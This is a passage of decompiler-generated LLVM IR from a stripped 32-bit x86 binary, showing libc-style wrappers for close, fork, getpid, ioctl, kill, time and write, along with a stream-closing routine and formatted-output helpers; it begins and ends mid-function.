  uselistorder i32 %v3_804abb6, { 2, 1, 0 }
  uselistorder i32 %v0_804abad, { 2, 1, 0 }
  uselistorder i32 %v2_804ac39, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-32, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 17, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 39, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38 }
  uselistorder i32 ()* @function_804d9c4, { 2, 1, 0 }
  uselistorder i32 -24, { 2, 0, 1 }
  uselistorder i32 -20, { 2, 0, 1 }
  uselistorder i32 (i32)* @function_804d410, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_804d2dc, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_804d540, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_804e9f8, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ad5a, { 1, 0 }
  uselistorder label %dec_label_pc_804ace8, { 1, 0 }
  uselistorder label %dec_label_pc_804ac6b, { 1, 0 }
  uselistorder label %dec_label_pc_804ab66.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804aba3, { 1, 0 }
}

define i32 @function_804b4a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b4a4:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b4a4 = load i32, i32* @edi, align 4
  store i32 %v0_804b4a4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804b4ac = load i32, i32* @ebx, align 4
  %v1_804b4b4 = call i32 @close(i32 %arg1)
  store i32 %v0_804b4ac, i32* @ebx, align 4
  store i32 %v1_804b4b4, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804b4b4, -4095
  br i1 %tmp8, label %dec_label_pc_804b4cc, label %dec_label_pc_804b4c0

dec_label_pc_804b4c0:                             ; preds = %dec_label_pc_804b4a4
  %v1_804b4c0 = call i32 @function_804b774(i32 %v0_804b4ac)
  %v0_804b4c5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b4c5 = sub i32 0, %v0_804b4c5
  %v2_804b4c7 = inttoptr i32 %v1_804b4c0 to i32*
  store i32 %v1_804b4c5, i32* %v2_804b4c7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b4cc

dec_label_pc_804b4cc:                             ; preds = %dec_label_pc_804b4a4, %dec_label_pc_804b4c0
  %v0_804b4cc = phi i32 [ %v1_804b4b4, %dec_label_pc_804b4a4 ], [ -1, %dec_label_pc_804b4c0 ]
  %v2_804b4d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b4d0, i32* @edi, align 4
  ret i32 %v0_804b4cc

; uselistorder directives
  uselistorder i32 %v1_804b4b4, { 1, 0, 2 }
  uselistorder i32 %v0_804b4ac, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b4cc, { 1, 0 }
}

define i32 @function_804b4d4() local_unnamed_addr {
dec_label_pc_804b4d4:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b4d4 = load i32, i32* @ebx, align 4
  store i32 %v0_804b4d4, i32* %stack_var_-4, align 4
  %v1_804b4dd = call i32 @fork(i32 %v0_804b4d4)
  store i32 %v1_804b4dd, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804b4dd, -4095
  br i1 %tmp6, label %dec_label_pc_804b4f4, label %dec_label_pc_804b4e8

dec_label_pc_804b4e8:                             ; preds = %dec_label_pc_804b4d4
  %v0_804b4e8 = load i32, i32* %stack_var_-4, align 4
  %v1_804b4e8 = call i32 @function_804b774(i32 %v0_804b4e8)
  %v0_804b4ed = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b4ed = sub i32 0, %v0_804b4ed
  %v2_804b4ef = inttoptr i32 %v1_804b4e8 to i32*
  store i32 %v1_804b4ed, i32* %v2_804b4ef, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b4f4

dec_label_pc_804b4f4:                             ; preds = %dec_label_pc_804b4d4, %dec_label_pc_804b4e8
  %v0_804b4f4 = phi i32 [ %v1_804b4dd, %dec_label_pc_804b4d4 ], [ -1, %dec_label_pc_804b4e8 ]
  %v2_804b4f8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b4f8, i32* @ebx, align 4
  ret i32 %v0_804b4f4

; uselistorder directives
  uselistorder i32 %v1_804b4dd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b4f4, { 1, 0 }
}

define i32 @function_804b5b8() local_unnamed_addr {
dec_label_pc_804b5b8:
  %v0_804b5b8 = load i32, i32* @global_var_8058750.102, align 16
  %v1_804b5c2 = icmp eq i32 %v0_804b5b8, 0
  br i1 %v1_804b5c2, label %dec_label_pc_804b5c8, label %dec_label_pc_804b5c6

dec_label_pc_804b5c6:                             ; preds = %dec_label_pc_804b5b8
  br label %dec_label_pc_804b5c8

dec_label_pc_804b5c8:                             ; preds = %dec_label_pc_804b5b8, %dec_label_pc_804b5c6
  %storemerge = phi i32 [ %v0_804b5b8, %dec_label_pc_804b5c6 ], [ 4096, %dec_label_pc_804b5b8 ]
  %v0_804b5c8 = phi i32 [ %v0_804b5b8, %dec_label_pc_804b5c6 ], [ 4096, %dec_label_pc_804b5b8 ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_804b5c8

; uselistorder directives
  uselistorder label %dec_label_pc_804b5c8, { 1, 0 }
}

define i32 @function_804b5cc() local_unnamed_addr {
dec_label_pc_804b5cc:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b5cc = load i32, i32* @ebx, align 4
  store i32 %v0_804b5cc, i32* %stack_var_-4, align 4
  %v1_804b5d5 = call i32 @getpid(i32 %v0_804b5cc)
  store i32 %v1_804b5d5, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804b5d5, -4095
  br i1 %tmp6, label %dec_label_pc_804b5ec, label %dec_label_pc_804b5e0

dec_label_pc_804b5e0:                             ; preds = %dec_label_pc_804b5cc
  %v0_804b5e0 = load i32, i32* %stack_var_-4, align 4
  %v1_804b5e0 = call i32 @function_804b774(i32 %v0_804b5e0)
  %v0_804b5e5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b5e5 = sub i32 0, %v0_804b5e5
  %v2_804b5e7 = inttoptr i32 %v1_804b5e0 to i32*
  store i32 %v1_804b5e5, i32* %v2_804b5e7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b5ec

dec_label_pc_804b5ec:                             ; preds = %dec_label_pc_804b5cc, %dec_label_pc_804b5e0
  %v0_804b5ec = phi i32 [ %v1_804b5d5, %dec_label_pc_804b5cc ], [ -1, %dec_label_pc_804b5e0 ]
  %v2_804b5f0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b5f0, i32* @ebx, align 4
  ret i32 %v0_804b5ec

; uselistorder directives
  uselistorder i32 %v1_804b5d5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b5ec, { 1, 0 }
}

define i32 @function_804b61c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b61c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b61c = load i32, i32* @edi, align 4
  store i32 %v0_804b61c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804b634 = load i32, i32* @ebx, align 4
  %v2_804b63c = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v0_804b634, i32* @ebx, align 4
  store i32 %v2_804b63c, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v2_804b63c, -4095
  br i1 %tmp11, label %dec_label_pc_804b654, label %dec_label_pc_804b648

dec_label_pc_804b648:                             ; preds = %dec_label_pc_804b61c
  %v1_804b648 = call i32 @function_804b774(i32 %v0_804b634)
  %v0_804b64d = load i32, i32* %edi.global-to-local, align 4
  %v1_804b64d = sub i32 0, %v0_804b64d
  %v2_804b64f = inttoptr i32 %v1_804b648 to i32*
  store i32 %v1_804b64d, i32* %v2_804b64f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b654

dec_label_pc_804b654:                             ; preds = %dec_label_pc_804b61c, %dec_label_pc_804b648
  %v0_804b654 = phi i32 [ %v2_804b63c, %dec_label_pc_804b61c ], [ -1, %dec_label_pc_804b648 ]
  %v2_804b659 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b659, i32* @edi, align 4
  ret i32 %v0_804b654

; uselistorder directives
  uselistorder i32 %v2_804b63c, { 1, 0, 2 }
  uselistorder i32 %v0_804b634, { 1, 0 }
  uselistorder label %dec_label_pc_804b654, { 1, 0 }
}

define i32 @function_804b65c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804b65c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b65c = load i32, i32* @ebx, align 4
  store i32 %v0_804b65c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804b66f = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_804b66f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804b66f, -4095
  br i1 %tmp8, label %dec_label_pc_804b688, label %dec_label_pc_804b67c

dec_label_pc_804b67c:                             ; preds = %dec_label_pc_804b65c
  %v0_804b67c = load i32, i32* %stack_var_-4, align 4
  %v1_804b67c = call i32 @function_804b774(i32 %v0_804b67c)
  %v0_804b681 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b681 = sub i32 0, %v0_804b681
  %v2_804b683 = inttoptr i32 %v1_804b67c to i32*
  store i32 %v1_804b681, i32* %v2_804b683, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b688

dec_label_pc_804b688:                             ; preds = %dec_label_pc_804b65c, %dec_label_pc_804b67c
  %v0_804b688 = phi i32 [ %v2_804b66f, %dec_label_pc_804b65c ], [ -1, %dec_label_pc_804b67c ]
  %v2_804b68a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b68a, i32* @edx, align 4
  %v2_804b68c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b68c, i32* @ebx, align 4
  ret i32 %v0_804b688

; uselistorder directives
  uselistorder i32 %v2_804b66f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b688, { 1, 0 }
}

define i32 @function_804b690(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804b690:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b691 = load i32, i32* @esi, align 4
  store i32 %v0_804b691, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804b6a9 = load i32, i32* @ebx, align 4
  %v1_804b6b1 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804b6a9, i32* @ebx, align 4
  store i32 %v1_804b6b1, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804b6b1, -4095
  br i1 %tmp11, label %dec_label_pc_804b6c9, label %dec_label_pc_804b6bd

dec_label_pc_804b6bd:                             ; preds = %dec_label_pc_804b690
  %v1_804b6bd = call i32 @function_804b774(i32 %v0_804b6a9)
  %v0_804b6c2 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b6c2 = sub i32 0, %v0_804b6c2
  %v2_804b6c4 = inttoptr i32 %v1_804b6bd to i32*
  store i32 %v1_804b6c2, i32* %v2_804b6c4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b6c9

dec_label_pc_804b6c9:                             ; preds = %dec_label_pc_804b690, %dec_label_pc_804b6bd
  %v0_804b6c9 = phi i32 [ %v1_804b6b1, %dec_label_pc_804b690 ], [ -1, %dec_label_pc_804b6bd ]
  %v2_804b6cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b6cc, i32* @esi, align 4
  ret i32 %v0_804b6c9

; uselistorder directives
  uselistorder i32 %v1_804b6b1, { 1, 0, 2 }
  uselistorder i32 %v0_804b6a9, { 1, 0 }
  uselistorder label %dec_label_pc_804b6c9, { 1, 0 }
}

define i32 @function_804b6d0(i32* %arg1) local_unnamed_addr {
dec_label_pc_804b6d0:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804b6d0 = load i32, i32* @edi, align 4
  store i32 %v0_804b6d0, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804b6d8 = load i32, i32* @ebx, align 4
  %v2_804b6e0 = call i32 @time(i32* %arg1)
  store i32 %v0_804b6d8, i32* @ebx, align 4
  store i32 %v2_804b6e0, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804b6e0, -4095
  br i1 %tmp9, label %dec_label_pc_804b6f8, label %dec_label_pc_804b6ec

dec_label_pc_804b6ec:                             ; preds = %dec_label_pc_804b6d0
  %v1_804b6ec = call i32 @function_804b774(i32 %v0_804b6d8)
  %v0_804b6f1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b6f1 = sub i32 0, %v0_804b6f1
  %v2_804b6f3 = inttoptr i32 %v1_804b6ec to i32*
  store i32 %v1_804b6f1, i32* %v2_804b6f3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b6f8

dec_label_pc_804b6f8:                             ; preds = %dec_label_pc_804b6d0, %dec_label_pc_804b6ec
  %v0_804b6f8 = phi i32 [ %v2_804b6e0, %dec_label_pc_804b6d0 ], [ -1, %dec_label_pc_804b6ec ]
  %v2_804b6fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b6fc, i32* @edi, align 4
  ret i32 %v0_804b6f8

; uselistorder directives
  uselistorder i32 %v2_804b6e0, { 1, 0, 2 }
  uselistorder i32 %v0_804b6d8, { 1, 0 }
  uselistorder label %dec_label_pc_804b6f8, { 1, 0 }
}

define i32 @function_804b700(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b700:
  %v5_804b711 = call i32 @function_804faa8(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* null)
  ret i32 %v5_804b711
}

define i32 @function_804b71c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b71c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b71c = load i32, i32* @edi, align 4
  store i32 %v0_804b71c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804b72c = load i32, i32* @ebx, align 4
  %v4_804b734 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804b72c, i32* @ebx, align 4
  store i32 %v4_804b734, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804b734, -4095
  br i1 %tmp11, label %dec_label_pc_804b74c, label %dec_label_pc_804b740

dec_label_pc_804b740:                             ; preds = %dec_label_pc_804b71c
  %v1_804b740 = call i32 @function_804b774(i32 %v0_804b72c)
  %v0_804b745 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b745 = sub i32 0, %v0_804b745
  %v2_804b747 = inttoptr i32 %v1_804b740 to i32*
  store i32 %v1_804b745, i32* %v2_804b747, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b74c

dec_label_pc_804b74c:                             ; preds = %dec_label_pc_804b71c, %dec_label_pc_804b740
  %v0_804b74c = phi i32 [ %v4_804b734, %dec_label_pc_804b71c ], [ -1, %dec_label_pc_804b740 ]
  %v2_804b74e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b74e, i32* @edx, align 4
  %v2_804b750 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b750, i32* @edi, align 4
  ret i32 %v0_804b74c

; uselistorder directives
  uselistorder i32 %v4_804b734, { 1, 0, 2 }
  uselistorder i32 %v0_804b72c, { 1, 0 }
  uselistorder label %dec_label_pc_804b74c, { 1, 0 }
}

define i32 @function_804b754(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b754:
  %v1_804b758 = add i32 %arg1, 128
  %v6_804b763 = icmp ugt i32 %v1_804b758, 383
  br i1 %v6_804b763, label %dec_label_pc_804b76e, label %dec_label_pc_804b765

dec_label_pc_804b765:                             ; preds = %dec_label_pc_804b754
  %v0_804b765 = load i32, i32* inttoptr (i32 134569508 to i32*), align 4
  %v2_804b76a = mul i32 %arg1, 2
  %v3_804b76a = add i32 %v0_804b765, %v2_804b76a
  %v4_804b76a = inttoptr i32 %v3_804b76a to i16*
  %v5_804b76a = load i16, i16* %v4_804b76a, align 2
  %v6_804b76a = sext i16 %v5_804b76a to i32
  br label %dec_label_pc_804b76e

dec_label_pc_804b76e:                             ; preds = %dec_label_pc_804b754, %dec_label_pc_804b765
  %v0_804b76e = phi i32 [ %arg1, %dec_label_pc_804b754 ], [ %v6_804b76a, %dec_label_pc_804b765 ]
  ret i32 %v0_804b76e

; uselistorder directives
  uselistorder label %dec_label_pc_804b76e, { 1, 0 }
}

define i32 @function_804b774(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b774:
  ret i32 ptrtoint (i32* @global_var_8058760.107 to i32)
}

define i32 @function_804b77c(i16* %arg1) local_unnamed_addr {
dec_label_pc_804b77c:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804b77c = load i32, i32* @ebp, align 4
  %v0_804b77d = load i32, i32* @edi, align 4
  %v0_804b77e = load i32, i32* @esi, align 4
  %v0_804b77f = load i32, i32* @ebx, align 4
  %v4_804b783 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804b783, i32* @esi, align 4
  %v1_804b787 = add i32 %v4_804b783, 52
  %v2_804b787 = inttoptr i32 %v1_804b787 to i32*
  %v3_804b787 = load i32, i32* %v2_804b787, align 4
  store i32 %v3_804b787, i32* @ebp, align 4
  %v1_804b78a = icmp eq i32 %v3_804b787, 0
  %v1_804b78c = icmp eq i1 %v1_804b78a, false
  br i1 %v1_804b78c, label %dec_label_pc_804b7ad, label %dec_label_pc_804b78e

dec_label_pc_804b78e:                             ; preds = %dec_label_pc_804b77c
  %v1_804b78e = add i32 %v4_804b783, 56
  store i32 %v1_804b78e, i32* @ebx, align 4
  %v2_804b798 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804b798, i32* @eax, align 4
  %v2_804b79d = call i32 @function_804f2ae(i32 %v2_804b798, i32 134541995)
  %v0_804b7a2 = load i32, i32* @ebx, align 4
  %v1_804b7a5 = call i32 @function_804f2ab(i32 %v0_804b7a2)
  store i32 %v1_804b7a5, i32* @eax, align 4
  %v0_804b7af.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b7ad

dec_label_pc_804b7ad:                             ; preds = %dec_label_pc_804b77c, %dec_label_pc_804b78e
  %v0_804b7b7 = phi i32 [ %v4_804b783, %dec_label_pc_804b77c ], [ %v0_804b7af.pre, %dec_label_pc_804b78e ]
  store i32 0, i32* @edi, align 4
  %v1_804b7af = inttoptr i32 %v0_804b7b7 to i8*
  %v2_804b7af = load i8, i8* %v1_804b7af, align 1
  %v3_804b7af = and i8 %v2_804b7af, 64
  %v4_804b7af = icmp eq i8 %v3_804b7af, 0
  br i1 %v4_804b7af, label %dec_label_pc_804b7ad.dec_label_pc_804b7c2_crit_edge, label %dec_label_pc_804b7b4

dec_label_pc_804b7ad.dec_label_pc_804b7c2_crit_edge: ; preds = %dec_label_pc_804b7ad
  br label %dec_label_pc_804b7c2

dec_label_pc_804b7b4:                             ; preds = %dec_label_pc_804b7ad
  %v1_804b7b8 = inttoptr i32 %v0_804b7b7 to i16*
  %v2_804b7b8 = call i32 @function_804ce30(i16* %v1_804b7b8)
  store i32 %v2_804b7b8, i32* @edi, align 4
  %v0_804b7c5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b7c2

dec_label_pc_804b7c2:                             ; preds = %dec_label_pc_804b7ad.dec_label_pc_804b7c2_crit_edge, %dec_label_pc_804b7b4
  %v0_804b7c5 = phi i32 [ %v0_804b7b7, %dec_label_pc_804b7ad.dec_label_pc_804b7c2_crit_edge ], [ %v0_804b7c5.pre, %dec_label_pc_804b7b4 ]
  %v1_804b7c5 = add i32 %v0_804b7c5, 4
  %v2_804b7c5 = inttoptr i32 %v1_804b7c5 to i32*
  %v3_804b7c5 = load i32, i32* %v2_804b7c5, align 4
  %v1_804b7c8 = call i32 @function_804b4a4(i32 %v3_804b7c5)
  store i32 %v1_804b7c8, i32* @eax, align 4
  %v2_804b7d0 = icmp slt i32 %v1_804b7c8, 0
  %v1_804b7d2 = icmp eq i1 %v2_804b7d0, false
  br i1 %v1_804b7d2, label %dec_label_pc_804b7d7, label %dec_label_pc_804b7d4

dec_label_pc_804b7d4:                             ; preds = %dec_label_pc_804b7c2
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804b7d7

dec_label_pc_804b7d7:                             ; preds = %dec_label_pc_804b7c2, %dec_label_pc_804b7d4
  %v0_804b7d7 = load i32, i32* @esi, align 4
  %v1_804b7d7 = add i32 %v0_804b7d7, 4
  %v2_804b7d7 = inttoptr i32 %v1_804b7d7 to i32*
  store i32 -1, i32* %v2_804b7d7, align 4
  %v2_804b7e9 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804b7e9, i32* @ebx, align 4
  %v2_804b7ee = call i32 @function_804f2ae(i32 %v2_804b7e9, i32 134541995)
  %v1_804b7fa = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055e58.108 to i32))
  %v0_804b7ff = load i32, i32* @global_var_8056520.109, align 32
  %v1_804b804 = add i32 %v0_804b7ff, 1
  store i32 %v1_804b804, i32* @global_var_8056520.109, align 32
  store i32 ptrtoint (i32* @global_var_8055e58.108 to i32), i32* @eax, align 4
  %v2_804b80f = call i32 @function_804f2ae(i32 %v2_804b7e9, i32 1)
  store i32 %v2_804b80f, i32* @eax, align 4
  %v0_804b817 = load i32, i32* @esi, align 4
  %v1_804b817 = inttoptr i32 %v0_804b817 to i16*
  %v2_804b817 = load i16, i16* %v1_804b817, align 2
  %v3_804b817 = and i16 %v2_804b817, 24576
  store i16 %v3_804b817, i16* %v1_804b817, align 2
  %v0_804b81c = load i32, i32* @esi, align 4
  %v1_804b81c = inttoptr i32 %v0_804b81c to i16*
  %v2_804b81c = load i16, i16* %v1_804b81c, align 2
  %v3_804b81c = or i16 %v2_804b81c, 48
  store i16 %v3_804b81c, i16* %v1_804b81c, align 2
  br i1 %v1_804b78c, label %dec_label_pc_804b835, label %dec_label_pc_804b824

dec_label_pc_804b824:                             ; preds = %dec_label_pc_804b7d7
  %v2_804b828 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804b828, i32* @eax, align 4
  %v2_804b82d = call i32 @function_804f2ae(i32 %v2_804b828, i32 1)
  store i32 %v2_804b82d, i32* @eax, align 4
  br label %dec_label_pc_804b835

dec_label_pc_804b835:                             ; preds = %dec_label_pc_804b7d7, %dec_label_pc_804b824
  %v0_804b835 = load i32, i32* @esi, align 4
  %v1_804b835 = add i32 %v0_804b835, 1
  %v2_804b835 = inttoptr i32 %v1_804b835 to i8*
  %v3_804b835 = load i8, i8* %v2_804b835, align 1
  %v4_804b835 = and i8 %v3_804b835, 64
  %v5_804b835 = icmp eq i8 %v4_804b835, 0
  br i1 %v5_804b835, label %dec_label_pc_804b849, label %dec_label_pc_804b83b

dec_label_pc_804b83b:                             ; preds = %dec_label_pc_804b835
  %v1_804b83e = add i32 %v0_804b835, 8
  %v2_804b83e = inttoptr i32 %v1_804b83e to i32*
  %v3_804b83e = load i32, i32* %v2_804b83e, align 4
  %v1_804b841 = call i32 @function_804e725(i32 %v3_804b83e)
  store i32 %v1_804b841, i32* @eax, align 4
  br label %dec_label_pc_804b849

dec_label_pc_804b849:                             ; preds = %dec_label_pc_804b835, %dec_label_pc_804b83b
  %v2_804b855 = call i32 @function_804f2ae(i32 %v2_804b7e9, i32 134541995)
  %v1_804b861 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055e58.108 to i32))
  store i32 ptrtoint (i32* @global_var_8055e58.108 to i32), i32* @eax, align 4
  %v0_804b868 = load i32, i32* @global_var_8056524.110, align 4
  %v1_804b868 = add i32 %v0_804b868, 1
  store i32 %v1_804b868, i32* @global_var_8056524.110, align 4
  %v2_804b871 = call i32 @function_804f2ae(i32 %v2_804b7e9, i32 1)
  %v0_804b876 = call i32 @function_804cd4c()
  %v0_804b87e = load i32, i32* @edi, align 4
  store i32 %v0_804b77f, i32* @ebx, align 4
  store i32 %v0_804b77e, i32* @esi, align 4
  store i32 %v0_804b77d, i32* @edi, align 4
  store i32 %v0_804b77c, i32* @ebp, align 4
  ret i32 %v0_804b87e

; uselistorder directives
  uselistorder label %dec_label_pc_804b849, { 1, 0 }
  uselistorder label %dec_label_pc_804b835, { 1, 0 }
  uselistorder label %dec_label_pc_804b7d7, { 1, 0 }
  uselistorder label %dec_label_pc_804b7c2, { 1, 0 }
  uselistorder label %dec_label_pc_804b7ad, { 1, 0 }
}

define i32 @function_804b888(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804b888:
  %v4_804b897 = inttoptr i32 %arg2 to i8*
  %v5_804b897 = call i32 @function_804bc48(i32 %arg1, i8* %v4_804b897, i32 0, i32 -1)
  ret i32 %v5_804b897
}

define i32 @function_804b8a0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b8a0:
  %v4_804b8b1 = inttoptr i32 %arg1 to i8*
  %v5_804b8b1 = call i32 @function_804b8dc(i8* %v4_804b8b1, i32 -1, i32 %arg2, i32 %arg3)
  ret i32 %v5_804b8b1
}

define i32 @function_804b8bc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b8bc:
  %stack_var_12 = alloca i32, align 4
  %v2_804b8bf = ptrtoint i32* %stack_var_12 to i32
  %v4_804b8d2 = inttoptr i32 %arg1 to i8*
  %v5_804b8d2 = call i32 @function_804b8dc(i8* %v4_804b8d2, i32 -1, i32 %arg2, i32 %v2_804b8bf)
  ret i32 %v5_804b8d2
}

define i32 @function_804b8dc(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b8dc:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b8dc = load i32, i32* @ebp, align 4
  %v0_804b8dd = load i32, i32* @edi, align 4
  %v0_804b8de = load i32, i32* @esi, align 4
  %v0_804b8df = load i32, i32* @ebx, align 4
  store i32 %v0_804b8df, i32* %stack_var_-16, align 4
  %v4_804b8e3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b8e3, i32* @esi, align 4
  %v2_804b8e7 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_804b918 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804b918, i32* @ebp, align 4
  %v1_804b91c = sub i32 -1, %v4_804b8e3
  store i32 %v1_804b91c, i32* @ebx, align 4
  %v1_804b91f = call i32 @function_804bed9(i32 %v2_804b8e7)
  %v0_804b92f = load i32, i32* @ebx, align 4
  %v1_804b92f = load i32, i32* @edi, align 4
  %tmp33 = icmp ugt i32 %v0_804b92f, %v1_804b92f
  br i1 %tmp33, label %dec_label_pc_804b933, label %dec_label_pc_804b935

dec_label_pc_804b933:                             ; preds = %dec_label_pc_804b8dc
  store i32 %v1_804b92f, i32* @ebx, align 4
  br label %dec_label_pc_804b935

dec_label_pc_804b935:                             ; preds = %dec_label_pc_804b8dc, %dec_label_pc_804b933
  %v1_804b935 = phi i32 [ %v0_804b92f, %dec_label_pc_804b8dc ], [ %v1_804b92f, %dec_label_pc_804b933 ]
  %v0_804b935 = load i32, i32* @esi, align 4
  %v2_804b935 = add i32 %v0_804b935, %v1_804b935
  %v4_804b960 = inttoptr i32 %arg3 to i8*
  %v5_804b960 = call i32 @function_804c044(i32 %v2_804b918, i8* %v4_804b960, i32 %arg4, i32 %v2_804b935)
  store i32 %v5_804b960, i32* %edx.global-to-local, align 4
  %v0_804b96a = load i32, i32* @ebx, align 4
  %v1_804b96a = icmp eq i32 %v0_804b96a, 0
